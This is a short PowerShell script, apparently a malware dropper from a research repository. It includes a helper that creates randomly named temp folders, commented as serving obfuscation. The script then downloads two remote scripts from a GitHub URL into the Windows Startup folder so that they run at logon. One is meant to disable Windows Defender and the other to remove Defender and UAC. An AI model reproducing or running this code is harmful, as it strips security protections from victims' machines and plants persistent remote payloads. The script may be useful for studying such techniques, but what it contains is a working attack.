# Make a directory with random name under temp directory for obfuscation
function New-RandomTempDirectory {
    param(
        [int]$Length = 16
    )

    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

    $randomName = -join (1..$Length | ForEach-Object {
        $chars[(Get-Random -Maximum $chars.Length)]
    })

    $tempPath = [System.IO.Path]::GetTempPath()
    $fullPath = Join-Path $tempPath $randomName

    New-Item -ItemType Directory -Path $fullPath -Force | Out-Null

    return $fullPath
}


# $dirPath = New-RandomTempDirectory
# Write-Host "Created directory: $dirPath"

# Download windows disabler
$startupPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup"
$url = "https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/disableWinDef.ps1"
$outFile = Join-Path $startupPath "disableWinDef.ps1"
Invoke-WebRequest -Uri $url -OutFile $outFile

# remove windows defender and uac
$startupPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup"
$url = "https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/defender_remover13.ps1"
$outFile = Join-Path $startupPath "defender_remover.ps1"
Invoke-WebRequest -Uri $url -OutFile $outFile